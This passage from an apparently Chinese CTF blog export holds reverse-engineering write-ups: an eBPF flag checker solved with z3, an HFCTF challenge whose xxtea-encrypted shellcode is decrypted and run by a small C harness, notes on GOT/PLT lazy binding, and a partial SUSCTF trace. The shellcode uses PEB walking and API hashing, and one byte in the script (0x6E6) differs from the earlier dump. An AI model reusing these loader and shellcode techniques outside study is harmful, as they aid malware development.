ff 00 00 00 00 *(u8 *)(r10 - 8) = r0 20: 7b 0a f0 ff 00 00 00 00 *(u64 *)(r10 - 16) = r0 21: 7b 0a e8 ff 00 00 00 00 *(u64 *)(r10 - 24) = r0 22: 67 01 00 00 20 00 00 00 r1 &lt;&lt;= 32 23: 77 01 00 00 20 00 00 00 r1 &gt;&gt;= 32 24: bf 10 00 00 00 00 00 00 r0 = r1 25: 27 00 00 00 8e cc 00 00 r0 *= 52366 26: 0f 05 00 00 00 00 00 00 r5 += r0 27: b7 06 00 00 01 00 00 00 r6 = 1 28: 18 00 00 00 95 59 73 a1 00 00 00 00 18 be 00 00 r0 = 209012997183893 ll 30: 5d 05 42 00 00 00 00 00 if r5 != r0 goto +66 &lt;LBB0_5&gt; 31: bf 35 00 00 00 00 00 00 r5 = r3 32: 27 05 00 00 bf f1 00 00 r5 *= 61887 33: bf 20 00 00 00 00 00 00 r0 = r2 34: 27 00 00 00 e5 6a 00 00 r0 *= 27365 35: 0f 50 00 00 00 00 00 00 r0 += r5 36: bf 45 00 00 00 00 00 00 r5 = r4 37: 27 05 00 00 d3 ad 00 00 r5 *= 44499 38: 0f 50 00 00 00 00 00 00 r0 += r5 39: bf 15 00 00 00 00 00 00 r5 = r1 40: 27 05 00 00 84 92 00 00 r5 *= 37508 41: 0f 50 00 00 00 00 00 00 r0 += r5 42: 18 05 00 00 40 03 54 e5 00 00 00 00 56 a5 00 00 r5 = 181792633258816 ll 44: 5d 50 34 00 00 00 00 00 if r0 != r5 goto +52 &lt;LBB0_5&gt; 45: bf 35 00 00 00 00 00 00 r5 = r3 46: 27 05 00 00 85 dd 00 00 r5 *= 56709 47: bf 20 00 00 00 00 00 00 r0 = r2 48: 27 00 00 00 28 80 00 00 r0 *= 32808 49: 0f 50 00 00 00 00 00 00 r0 += r5 50: bf 45 00 00 00 00 00 00 r5 = r4 51: 27 05 00 00 2d 65 00 00 r5 *= 25901 52: 0f 50 00 00 00 00 00 00 r0 += r5 53: bf 15 00 00 00 00 00 00 r5 = r1 54: 27 05 00 00 12 e7 00 00 r5 *= 59154 55: 0f 50 00 00 00 00 00 00 r0 += r5 56: 18 05 00 00 a3 4d 48 74 00 00 00 00 f3 a6 00 00 r5 = 183564558159267 ll 58: 5d 50 26 00 00 00 00 00 if r0 != r5 goto +38 &lt;LBB0_5&gt; 59: bf 35 00 00 00 00 00 00 r5 = r3 60: 27 05 00 00 2c 82 00 00 r5 *= 33324 61: bf 20 00 00 00 00 00 00 r0 = r2 62: 27 00 00 00 43 ca 00 00 r0 *= 51779 63: 0f 50 00 00 00 00 00 00 r0 += r5 64: bf 45 00 00 00 00 00 00 r5 = r4 65: 27 05 00 00 8e 7c 00 00 r5 *= 31886 66: 0f 50 00 00 00 00 00 00 r0 += r5 67: bf 15 00 00 00 00 00 00 r5 = r1 68: 27 05 00 00 3a f2 00 00 r5 *= 62010 69: 0f 50 00 00 00 00 00 00 r0 += r5 70: 18 05 00 00 77 72 5a 48 00 00 00 00 9c b9 00 00 r5 = 204080879923831 ll 72: 5d 50 18 00 00 00 00 00 if r0 != r5 goto +24 &lt;LBB0_5&gt; 73: 63 1a f4 ff 00 00 00 00 *(u32 *)(r10 - 12) = r1 74: 63 4a f0 ff 00 00 00 00 *(u32 *)(r10 - 16) = r4 75: 63 2a ec ff 00 00 00 00 *(u32 *)(r10 - 20) = r2 76: 63 3a e8 ff 00 00 00 00 *(u32 *)(r10 - 24) = r3 77: 18 01 00 00 43 54 46 7b 00 00 00 00 25 73 7d 0a r1 = 755886917287302211 ll 79: 7b 1a d8 ff 00 00 00 00 *(u64 *)(r10 - 40) = r1 80: 18 01 00 00 46 4c 41 47 00 00 00 00 3a 20 48 46 r1 = 5064333215653776454 ll 82: 7b 1a d0 ff 00 00 00 00 *(u64 *)(r10 - 48) = r1 83: 18 01 00 00 45 21 20 59 00 00 00 00 4f 55 52 20 r1 = 2329017756590022981 ll 85: 7b 1a c8 ff 00 00 00 00 *(u64 *)(r10 - 56) = r1 86: 18 01 00 00 57 45 4c 4c 00 00 00 00 20 44 4f 4e r1 = 5642803763628229975 ll 88: 7b 1a c0 ff 00 00 00 00 *(u64 *)(r10 - 64) = r1 89: b7 06 00 00 00 00 00 00 r6 = 0 90: 73 6a e0 ff 00 00 00 00 *(u8 *)(r10 - 32) = r6 91: bf a1 00 00 00 00 00 00 r1 = r10 92: 07 01 00 00 c0 ff ff ff r1 += -64 93: bf a3 00 00 00 00 00 00 r3 = r10 94: 07 03 00 00 e8 ff ff ff r3 += -24 95: b7 02 00 00 21 00 00 00 r2 = 33 96: 85 00 00 00 06 00 00 00 call 6LBB0_5: 97: bf 60 00 00 00 00 00 00 r0 = r6 98: 95 00 00 00 00 00 00 00 exit 123456789101112131415161718192021222324252627from z3 import *from Crypto.Util.number import *r2 = Int(&#x27;r2&#x27;) # flag[2]r3 = Int(&#x27;r3&#x27;) # flag[3]r4 = Int(&#x27;r4&#x27;) # flag[1]r1 = Int(&#x27;r1&#x27;) # flag[0]s = Solver()s.add(r3 * 28096 + r2 * 64392 + r4 * 29179 + r1 * 52366 == 209012997183893)s.add(r3 * 61887 + r2 * 27365 + r4 * 44499 + r1 * 37508 == 181792633258816)s.add(r3 * 56709 + r2 * 32808 + r4 * 25901 + r1 * 59154 == 183564558159267)s.add(r3 * 33324 + r2 * 51779 + r4 * 31886 + r1 * 62010 == 204080879923831)assert s.check() == satflag = b&quot;&quot;m = s.model()# for i in [r1, r4, r2, r3]:# flag += long_to_bytes(m[i].as_long())[::-1]for i in [r3, r2, r4, r1]: flag += long_to_bytes(m[i].as_long())[::-1]print(flag)# 0vR3sAlbs8pD2h53 the_shellcode执行程序，dump下来，IDA打开dump文件分析，配合OD动态调试程序，发现↓程序逻辑为先输入base64加密的shellcode（len=352），然后shellcode解密，每一个字节执行rol 3操作，再魔改的xxtea解密，然后再输入flag（len=14）,再根据shellcode验证flag xxtea密文是 byte_1A3310[264] 12345678910111213141516171819202122232425262728293031unsigned char ida_chars[] =&#123; 0xA1, 0x89, 0x6B, 0x4B, 0x53, 0x54, 0xC1, 0x74, 0x6E, 0xA0, 0x92, 0x40, 0x07, 0x0C, 0x9B, 0x42, 0x84, 0x1E, 0x28, 0x40, 0xC9, 0x44, 0x5B, 0x8B, 0x7B, 0xB3, 0xFE, 0x66, 0x03, 0xA6, 0x77, 0x3C, 0x2D, 0x89, 0xC5, 0x79, 0x97, 0xDA, 0x7A, 0x0D, 0x56, 0xAA, 0x51, 0x1D, 0x03, 0xD7, 0xD4, 0x02, 0xBA, 0x26, 0xA5, 0x4F, 0x4A, 0xD6, 0xFA, 0x32, 0x91, 0x60, 0x0F, 0x0C, 0x93, 0x75, 0x2B, 0x56, 0x67, 0xDD, 0x9A, 0xDB, 0x63, 0x55, 0x16, 0x76, 0x15, 0x93, 0xF7, 0xA5, 0x1D, 0x99, 0xEB, 0x3A, 0xD4, 0x21, 0xB7, 0x1A, 0x2C, 0x9D, 0xCD, 0xAA, 0x27, 0x2B, 0x5C, 0x82, 0x1A, 0x76, 0xA7, 0x76, 0x18, 0x5F, 0x00, 0xB4, 0x63, 0x37, 0x7F, 0x11, 0x40, 0xC5, 0x2C, 0x51, 0x6F, 0xA1, 0x94, 0xC5, 0x8C, 0x4F, 0xE2, 0xD0, 0xE9, 0xE2, 0xA3, 0x9C, 0xD5, 0xC2, 0x9C, 0x0A, 0x1D, 0xE6, 0x29, 0x46, 0xE3, 0x29, 0x71, 0x63, 0xD7, 0x8A, 0x4E, 0xCA, 0x71, 0xAF, 0xDF, 0xF5, 0xAB, 0x68, 0x4E, 0x47, 0x3A, 0xBC, 0x2F, 0x54, 0x17, 0x16, 0x74, 0xD6, 0xE5, 0xBB, 0x0D, 0xAD, 0xE3, 0xBB, 0xF7, 0x62, 0x07, 0x8C, 0xD6, 0xC8, 0x0E, 0x95, 0x0E, 0x88, 0xBA, 0x25, 0x0F, 0xF8, 0x4C, 0x26, 0x7A, 0x76, 0x14, 0xE0, 0x7C, 0x9A, 0xEE, 0xC9, 0x8B, 0x5C, 0xD4, 0xF7, 0x9E, 0x5D, 0xDE, 0xAC, 0x99, 0xB9, 0x13, 0x8E, 0xEC, 0xB2, 0x2D, 0x23, 0x68, 0xEE, 0xCE, 0x5F, 0x7C, 0x92, 0x5D, 0xA8, 0xE3, 0xC9, 0x6B, 0xB5, 0x74, 0xAC, 0x12, 0xE7, 0xB6, 0x42, 0xDA, 0x98, 0x28, 0xCD, 0x58, 0x1C, 0xF1, 0xFC, 0xEE, 0x75, 0x70, 0xF5, 0x78, 0xE6, 0x76, 0x50, 0x35, 0x6A, 0xD6, 0xD4, 0xB9, 0x5A, 0x10, 0x95, 0x03, 0x44, 0xB0, 0x1B, 0x59, 0xB9, 0x40, 0xB2, 0x1A, 0x26, 0x4E, 0x7B, 0xD8, 0x29, 0xD1, 0x23, 0xCD, 0x52, 0xE7, 0xF5, 0x70, 0x8F, 0xA7, 0x4E&#125;; 魔改为 #define MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) 解密shellcode的脚本为 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x61C88647 #define MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t* v, int n, uint32_t const key[4])&#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum -= DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) /* Decoding Part */ &#123; n = -n; rounds = 6 + 52 / n; sum = 0 - rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum += DELTA; &#125; while (--rounds); &#125;&#125;unsigned char enc_shellcode[] =&#123; 0xA1, 0x89, 0x6B, 0x4B, 0x53, 0x54, 0xC1, 0x74, 0x6E6, 0xA0, 0x92, 0x40, 0x07, 0x0C, 0x9B, 0x42, 0x84, 0x1E, 0x28, 0x40, 0xC9, 0x44, 0x5B, 0x8B, 0x7B, 0xB3, 0xFE, 0x66, 0x03, 0xA6, 0x77, 0x3C, 0x2D, 0x89, 0xC5, 0x79, 0x97, 0xDA, 0x7A, 0x0D, 0x56, 0xAA, 0x51, 0x1D, 0x03, 0xD7, 0xD4, 0x02, 0xBA, 0x26, 0xA5, 0x4F, 0x4A, 0xD6, 0xFA, 0x32, 0x91, 0x60, 0x0F, 0x0C, 0x93, 0x75, 0x2B, 0x56, 0x67, 0xDD, 0x9A, 0xDB, 0x63, 0x55, 0x16, 0x76, 0x15, 0x93, 0xF7, 0xA5, 0x1D, 0x99, 0xEB, 0x3A, 0xD4, 0x21, 0xB7, 0x1A, 0x2C, 0x9D, 0xCD, 0xAA, 0x27, 0x2B, 0x5C, 0x82, 0x1A, 0x76, 0xA7, 0x76, 0x18, 0x5F, 0x00, 0xB4, 0x63, 0x37, 0x7F, 0x11, 0x40, 0xC5, 0x2C, 0x51, 0x6F, 0xA1, 0x94, 0xC5, 0x8C, 0x4F, 0xE2, 0xD0, 0xE9, 0xE2, 0xA3, 0x9C, 0xD5, 0xC2, 0x9C, 0x0A, 0x1D, 0xE6, 0x29, 0x46, 0xE3, 0x29, 0x71, 0x63, 0xD7, 0x8A, 0x4E, 0xCA, 0x71, 0xAF, 0xDF, 0xF5, 0xAB, 0x68, 0x4E, 0x47, 0x3A, 0xBC, 0x2F, 0x54, 0x17, 0x16, 0x74, 0xD6, 0xE5, 0xBB, 0x0D, 0xAD, 0xE3, 0xBB, 0xF7, 0x62, 0x07, 0x8C, 0xD6, 0xC8, 0x0E, 0x95, 0x0E, 0x88, 0xBA, 0x25, 0x0F, 0xF8, 0x4C, 0x26, 0x7A, 0x76, 0x14, 0xE0, 0x7C, 0x9A, 0xEE, 0xC9, 0x8B, 0x5C, 0xD4, 0xF7, 0x9E, 0x5D, 0xDE, 0xAC, 0x99, 0xB9, 0x13, 0x8E, 0xEC, 0xB2, 0x2D, 0x23, 0x68, 0xEE, 0xCE, 0x5F, 0x7C, 0x92, 0x5D, 0xA8, 0xE3, 0xC9, 0x6B, 0xB5, 0x74, 0xAC, 0x12, 0xE7, 0xB6, 0x42, 0xDA, 0x98, 0x28, 0xCD, 0x58, 0x1C, 0xF1, 0xFC, 0xEE, 0x75, 0x70, 0xF5, 0x78, 0xE6, 0x76, 0x50, 0x35, 0x6A, 0xD6, 0xD4, 0xB9, 0x5A, 0x10, 0x95, 0x03, 0x44, 0xB0, 0x1B, 0x59, 0xB9, 0x40, 0xB2, 0x1A, 0x26, 0x4E, 0x7B, 0xD8, 0x29, 0xD1, 0x23, 0xCD, 0x52, 0xE7, 0xF5, 0x70, 0x8F, 0xA7, 0x4E&#125;;int main()&#123; uint32_t* v = (uint32_t *)enc_shellcode; uint32_t const k[4] = &#123;116, 111, 114, 97 &#125;; btea(v, -66, k); for (int i = 0; i &lt; 264; i++) &#123; enc_shellcode[i] = ((enc_shellcode[i] &gt;&gt; 3) &amp; 0XFF) | ((enc_shellcode[i] &lt;&lt; 5) &amp; 0XFF); &#125; for (int i = 0; i &lt; 264; i++) &#123; printf(&quot;\\\\x%02x&quot;, enc_shellcode[i]); &#125; return 0;&#125; base64加密后是:YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL//// 写程序，直接F5看shellcode 123456789101112#include &lt;stdio.h&gt; char shellcode[] = &#123; 0x60, 0xfc, 0x68, 0x4c, 0x77, 0x26, 0x7, 0x33, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0xf, 0xb7, 0x4a, 0x26, 0x33, 0xff, 0x33, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x3, 0xc2, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0xf, 0x84, 0xbe, 00, 00, 00, 0x3, 0xc2, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x3, 0xda, 0x83, 0xf9, 00, 0xf, 0x84, 0xa9, 00, 00, 00, 0x49, 0x8b, 0x34, 0x8b, 0x3, 0xf2, 0x33, 0xff, 0x33, 0xc0, 0xac, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x3a, 0xc4, 0x75, 0xf4, 0x3, 0x7c, 0x24, 0x4, 0x3b, 0x7c, 0x24, 0xc, 0x75, 0xd9, 0x33, 0xff, 0x33, 0xc9, 0x83, 0xc2, 0x50, 0xf, 0xb6, 0x4, 0xa, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x41, 0x83, 0xf9, 0xe, 0x75, 0xf1, 0xc1, 0xcf, 0xd, 0x57, 0x33, 0xff, 0x33, 0xc9, 0x8b, 0x54, 0x24, 0x3c, 0x52, 0xf, 0xb6, 0x1c, 0xe, 0xb8, 0x67, 0x66, 0x66, 0x66, 0xf7, 0xeb, 0xd1, 0xfa, 0x8b, 0xc2, 0xc1, 0xe8, 0x1f, 0x3, 0xc2, 0x8d, 0x4, 0x80, 0x2b, 0xd8, 0x5a, 0xf, 0xb6, 0x4, 0xa, 0x2b, 0xc3, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x41, 0x83, 0xf9, 0xe, 0x75, 0xd4, 0xc1, 0xcf, 0xd, 0x3b, 0x3c, 0x24, 0x74, 0x16, 0x68, 0x25, 0x73, 00, 00, 0x8b, 0xc4, 0x68, 0x6e, 0x6f, 00, 00, 0x54, 0x50, 0x8b, 0x5c, 0x24, 0x48, 0xff, 0xd3, 0xeb, 0x14, 0x68, 0x25, 0x73, 00, 00, 0x8b, 0xc4, 0x68, 0x79, 0x65, 0x73, 00, 0x54, 0x50, 0x8b, 0x5c, 0x24, 0x48, 0xff, 0xd3, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x61, 0xc3, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xe9, 0xb, 0xff, 0xff, 0xff &#125;;int main()&#123; __asm &#123; lea eax, shellcode; push eax; ret &#125; return 0;&#125; 配合OD动调分析如下图 写脚本解密即可 123456789key = [1, 1, 2, 0, 1, 0, 3, 4, 2, 4, 1, 4, 0, 0]flag_fake = b&quot;is program can&quot;flag = [flag_fake[i] + key[i] for i in range(14)]print(bytes(flag))# b&#x27;jt&quot;psojvcq!gan&#x27;a = b&quot;YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL////&quot; + b&#x27;jt&quot;psojvcq!gan&#x27;print(&quot;HFCTF&#123;&quot; + md5(a).hexdigest() + &quot;&#125;&quot;)# HFCTF&#123;2b794e95022f2fe46106c21bbf57a755&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://zzzzsky.github.io/tags/shellcode/"}]},{"title":"第2章_二进制文件","slug":"第2章_二进制文件","date":"2022-03-16T06:20:00.000Z","updated":"2022-03-22T12:26:02.352Z","comments":true,"path":"2022/03/16/第2章_二进制文件/","link":"","permalink":"https://zzzzsky.github.io/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/","excerpt":"","text":"看到静态链接和动态链接这里，静态链接和windows上感觉一样，就不写了，感觉这里有个位置无关代码和延迟绑定挺有意思，记录一下 位置无关代码​ 在windows平台上，对于DLL文件的全局变量，在DLL加载到内存中后，要是没有加载到对应的位置，需要重定位，这个时候就需要重定位表, 而这里提到了一个位置无关代码的概念，可以加载而无需重定位的代码称为位置无关代码（Position-Independent Code, PIC），通过GCC传递 -fpic 参数就可以生成PIC。 1个ELF文件本身，数据段和代码段的相对距离是不变的，因此指令和变量之间的举例就是一个运行时常量，与绝对地址无关，这就是PIC的核心。 全局偏移量表GOT（Global Offset Table）被拆分为.got节和.got.plt节，可以理解为是个数组，单位是8字节 .got 不需要延迟绑定，用于保存全局变量引用，加载到内存标记为只读 .got.plt 需要延迟绑定，保存函数引用，具有读写权限 写代码测试下 (比书上多加了一个func2，为了测试延迟绑定调用那个_dl_runtime_resolve前的push ,是不是push的func的索引) 123456789101112131415161718192021222324//main.cextern int shared;extern void func(int *a, int *b);extern void func2(int *a, int *b);int main()&#123; int a= 100; func(&amp;a, &amp;shared); func2(&amp;a, &amp;shared); return 0;&#125;//func.cint shared = 1;int tmp = 0;void func(int * a, int *b)&#123; tmp = *a; *a = *b; *b = tmp;&#125;void func2(int * a, int *b)&#123; *a = *b;&#125; 12gcc -shared -fpic -o func.so func.cgcc -fno-stack-protector -fno-pie -no-pie -o func.ELF2 main.c ./func.so # 这里与书上不一样，查到-fno-pie -no-pie 去除地址随机化，要不影响实验 12345678910111213╭─ ~/Desktop/testC/dyn ✔ ╰─ objdump -d -M intel --section=.text func.so | grep -A 10 &quot;&lt;func&gt;&quot;00000000000005ea &lt;func&gt;: 5ea: 55 push rbp 5eb: 48 89 e5 mov rbp,rsp 5ee: 48 89 7d f8 mov QWORD PTR [rbp-0x8],rdi 5f2: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 5f6: 48 8b 45 f8 mov rax,QWORD PTR [rbp-0x8] 5fa: 8b 10 mov edx,DWORD PTR [rax] 5fc: 48 8b 05 d5 09 20 00 mov rax,QWORD PTR [rip+0x2009d5] # 200fd8 &lt;tmp-0x50&gt; 603: 89 10 mov DWORD PTR [rax],edx 605: 48 8b 45 f0 mov rax,QWORD PTR [rbp-0x10] 609: 8b 10 mov edx,DWORD PTR [rax] 因为这个地方写的是RIP +0x2009d5， 是一个偏移，而不是一个写死的地址，所以是PIC, 因为RIP其实就是基址+ 固定的偏移，所以不管基址怎么变化，这个地方的RIP + 0X2009E5指向的总是tmp变量， 如下如，这里是IDA动态调试起来的样子。 延迟绑定​ 对于调用的别的so中的函数，只有当这个函数真正调用的时候，才往对应地址处写入这个函数的地址，因为如果导入的函数比较多，都在一开始加载地址的话，会影响性能。 ELF文件通过过程链接表（Procedure Linkage Table, PLT）和GOT表配合来实现延迟绑定。，PLT也是个数组，单位是16字节，PLT[0]是用于跳转到动态链接器，IDA远程动态调试观, 在call func处下断点，观察PLT(指的是.plt节处的数据) 和 GOT(这里指的是.got.plt节处的数据)，整理下来 1234567891011121314151617181920212223# 下断点位置.text:0000000000400652 E8 E9 FE FF FF call sub_400540 ; func函数# PLT[0] .plt:0000000000400520 push cs:qword_601008.plt:0000000000400526 jmp cs:qword_601010# PLT[1].plt:0000000000400530 jmp cs:off_601018.plt:0000000000400536 push 0.plt:000000000040053B jmp sub_400520# PLT[2].plt:0000000000400540 jmp cs:off_601020.plt:0000000000400546 push 1.plt:000000000040054B jmp sub_400520# GOT[0].got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC# GOT[1].got.plt:0000000000601008 qword_601008 dq 7F53FD96D170h ; DATA XREF: sub_400520↑r ;reloc entries# GOT[2].got.plt:0000000000601010 qword_601010 dq 7F53FD7598F0h ; DATA XREF: sub_400520+6↑r ; _dl_runtime_resolve# GOT[3].got.plt:0000000000601018 off_601018 dq offset sub_400536 ; DATA XREF: .plt:loc_400530↑r ; func2# GOT[4].got.plt:0000000000601020 off_601020 dq offset sub_400546 ; DATA XREF: .plt:loc_400540↑r ; func 然后再在call func2那里下断点，再次观察PLT表和GOT表 12345.text:0000000000400663 E8 C8 FE FF FF call loc_400530 ; func2函数# GOT[3].got.plt:0000000000601018 off_601018 dq offset sub_400536 ; DATA XREF: .plt:loc_400530↑r ; func2# GOT[4]got.plt:0000000000601020 off_601020 dq offset func ; DATA XREF: .plt:loc_400540↑r ; func 可以发现GOT[4]这里已经填入了真正的函数地址，因为前面在调用func的时候,压入了1，而func在GOT表中，在函数的索引这里确实是1（除去其他固定的DYNAMIC， reloc entries， 和dl_runtime_resolve） 12.plt:0000000000400546 push 1.plt:000000000040054B jmp sub_400520 在调用func2的时候是push 0 ，我们这里把0改为1，patch下，测试下我们的猜想 执行，可以发现确实是调用了func函数 再观察下GOT表，看看有没有变化 显然，GOT表没有变化，所以猜测成功。 这里用EXCLE表格来表示下整体的流程","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"2022_SUSCTF_tttree题解","slug":"2022_SUSCTF部分RE_WP","date":"2022-03-03T02:55:00.000Z","updated":"2022-03-03T03:03:51.453Z","comments":true,"path":"2022/03/03/2022_SUSCTF部分RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/","excerpt":"","text":"2022_SUSCTF_tttree题解这道题比赛时，逆出了整个节点结构体，就是最后通过二叉树找到索引的时候不会了，只爆破出来了flag的4位，后来看了看别人的WP才发现程序中是存着节点之间的关系的（可惜啊，当时调试还是没有足够的耐心啊，这里复现下， 首先将程序去除ASLR, 用CFF Explorer打开程序，去除去除DLL Can move的属性，然后保存，这样每次程序加载的基址就不会变，就可以方便的下断点了 输入flag，按下暂停键， 然后回车，程序断下，直接ALT+F9 运行到用户代码 观察堆栈，可以发现在00014000E1B0的位置处存着输入的flag，直接转过去，下硬件断点，然后执行 发现程序是从1开始验证的，正好略过了前面的SUSCTF，也就是说他会检测SUSCTF{xxx } 里的 xxx，这里就会发现程序用了花指令，每一段里面存放着1条真正的指令 一路F7，观察执行的汇编，整理 1234567891011121314RAX是自己输入的字符 # 0x31RDX # 0X60 每一次都是固定的RCX # mov ecx, dword ptr ss:[rsp+0x30] 也是每次固定的数据 0XC1RCX = (RDX + 97) # RCX的数据恰好是RDX + 97 RCX = RAX + RCX # RCX = 0XC1 + 0X31 == 0XF2RAX = RCX # RAX = 0XF2EAX + i(index) # EAX = EAX + 0(第一次是0) EAX = (0XF2 + 0) EAX = 0XF2RCX = imov dword ptr ss:[rsp+rcx*4+0x40], eax # 把算好的EAX放到了某个固定的位置 放在了栈中，是个局部变量.... 000000014001C2D6 | 48:83F8 28 | cmp rax,0x28 # 通过这里可以看出flag的长度是40位，除去SUSCTF&#123;&#125; ，中间的是32位..... 将EDX里面的值提取出来， 12key = [0x60, 0x46, 0x62, 0x03, 0x16, 0x19, 0x1E, 0x12, 0x4D, 0x51, 0x05, 0x25, 0x38, 0x2F, 0x14, 0x4F, 0x5B, 0x2D, 0x4C, 0x26, 0x5A, 0x0F, 0x04, 0x07, 0x5F, 0x1D, 0x48, 0x1F, 0x67, 0x44, 0x3B, 0x37] 可以发现，只要把加密后的enc_flag执行 flag = [enc_flag[i] - key[i] - 97 - i for i in range(32)] 就可以得到flag了 继续F7运行, 提取出有效的汇编指令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143# 验证完长度是40后# 初始位置XXXXmov dword ptr ss:[rsp+0x24], 0x0 cmp dword ptr ss:[rsp+0x24], 0x20 # i &lt; 32? # 地址是00000001400158B8 movsxd rax, dword ptr ss:[rsp+0x24]mov edx, dword ptr ss:[rsp+rax*4+0x40] # 取加密后的inputlea rcx, ds:[0x00000001400073B0] mov dword ptr ss:[rsp+0x10], edx mov qword ptr ss:[rsp+0x8], rcx # 00000001400073B0sub rsp, 0x28mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxcmp dword ptr ds:[rax], 0x0 # 地址是：0000000140002A7Dje 0x00000001400122FE # 第一次是跳#****************************************************这是跳的情况****************************************************mov eax, dword ptr ds:[0x00000001400073B8] # 初始值是0inc eaxmov dword ptr ds:[0x00000001400073B8], eax # [0x00000001400073B8]++ mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给rax mov ecx, dword ptr ds:[0x00000001400073B8] mov dword ptr ds:[rax], ecx # 就是把[0x00000001400073B8] --&gt; [0x00000001400073B0] mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给 raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0]mov dword ptr ds:[rcx+rax*1+0x14], 0x1 mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov dword ptr ds:[rcx+rax*1+0xC], 0x1mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0] mov edx,dword ptr ss:[rsp+0x38] # 地址时: 0000000140016535 | 8B5424 38 取出EDX，即前面的加密后的inputmov dword ptr ds:[rcx+rax*1+0x8], edxmov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给 RAXmov eax, dword ptr ds:[rax]add eax, 0x6lea rcx, ds:[0x000000014000E1B0] # 0x000000014000E1B0 是输入的原始flag的全局位置movsx eax, byte ptr ds:[rcx+rax*1] # 取出 0x31 (&#x27;1&#x27;) 这是自己输入的mov rcx, qword ptr ss:[rsp+0x30] # 00000001400073B0 给 